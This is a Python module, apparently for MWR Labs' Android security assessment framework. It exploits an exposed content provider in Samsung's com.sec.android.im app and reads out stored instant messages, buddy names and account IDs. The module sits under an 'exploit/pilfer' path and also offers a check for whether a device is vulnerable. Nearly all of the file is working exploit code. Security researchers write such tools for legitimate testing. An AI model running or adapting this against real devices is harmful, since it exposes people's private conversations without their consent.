from mwr.droidhg.modules import common, Module

class IM(Module, common.Provider, common.TableFormatter, common.Vulnerability):

    name = "Tests for Content Provider vulnerability in com.sec.android.im."
    description = "Tests for Content Provider vulnerability in com.sec.android.im."
    examples = ""
    author = "Tyrone (@mwrlabs)"
    date = "2012-11-06"
    license = "MWR Code License"
    path = ["exploit", "pilfer", "oem", "samsung"]

    label = "Instant messages from IM (com.sec.android.im)"
    
    def exploit(self, arguments):
        c = self.getCursor()
        
        if c != None:
            rows = self.getResultSet(c)

            self.print_table(rows, show_headers=True)
        else:
            self.stdout.write("Unknown Error.\n")

    def getCursor(self):
        return self.contentResolver().query("content://com.tecace.app.convprovider", projection=["_id", "accountId", "buddy_name", "message"])

    def isVulnerable(self, arguments):
        cursor = self.getCursor()

        return cursor != None and cursor.getCount() > 0
